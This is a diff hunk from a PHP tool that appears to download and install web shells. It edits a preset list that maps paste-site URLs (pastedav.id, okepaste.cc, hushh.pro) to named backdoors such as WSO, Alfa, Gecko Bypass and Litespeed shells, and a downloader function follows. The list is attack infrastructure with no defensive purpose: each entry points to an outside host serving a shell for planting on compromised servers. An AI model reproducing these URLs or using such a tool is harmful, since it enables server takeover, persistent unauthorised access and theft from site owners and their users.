@@ -52,22 +52,12 @@ $status_log = "";
 // --- PRESET TEMPLATES ---
 $templates = [
     "" => "-- Select Module Template --",
-    "https://pastedav.id/d/fzGV1XSK" => "Template 1: PTSMC Shell",
-    "https://hushh.pro/a1/webshell/alfasc.txt" => "Template 2: Alfa Shell",
-    "https://hushh.pro/a1/webshell/gelay.txt" => "Template 3: Gelay Shell",
-    "https://okepaste.cc/r/19c86cf0" => "Template 4: Waras Shell",
-    "https://okepaste.cc/r/79e072b0" => "Template 5: Super Shell",
-    "https://okepaste.cc/r/eb04dde9" => "Template 6: PTSMC (CN Version) Shell",
-    "https://okepaste.cc/r/3045c618" => "Template 7: Clay Shell",
-    "https://hushh.pro/a1/webshell/selda1.txt" => "Template 8: Selda Shell",
-    "https://okepaste.cc/r/c43810d9" => "Template 9: FM Shell",
-    "https://okepaste.cc/r/f1c4f901" => "Template 10: WSO Shell",
-    "https://okepaste.cc/r/0c185e84" => "Template 11: Bypass-(White Shell)",
-    "https://okepaste.cc/r/36c6cfb7" => "Template 12: Skobam",
-    "https://okepaste.cc/r/6f3fca90" => "Template 13: Gecko (Bypass)",
-    "https://okepaste.cc/r/c7c7d772" => "Template 14: Evolution",
-    "https://okepaste.cc/r/09405460" => "Template 15: Litespeed",
-    "https://okepaste.cc/r/9c734c02" => "Template 16: Alfabypass"
+    "https://pastedav.id/d/Qqdehiyg" => "Template 1: PTSMC Shell",
+    "https://pastedav.id/d/bcXnD75i" => "Template 2: CPANEL Shell",
+    "https://pastedav.id/d/M2n7kGx0" => "Template 3: PTSMC-CN Shell",
+    "https://pastedav.id/d/ACpo1ljg" => "Template 4: Gacko Shell",
+    "https://pastedav.id/d/mWiAowIS" => "Template 5: WSO Shell",
+    "https://okepaste.cc/r/9c734c02" => "Template 7: Alfabypass"
 ];
 
 // --- DOWNLOADER FUNCTION ---
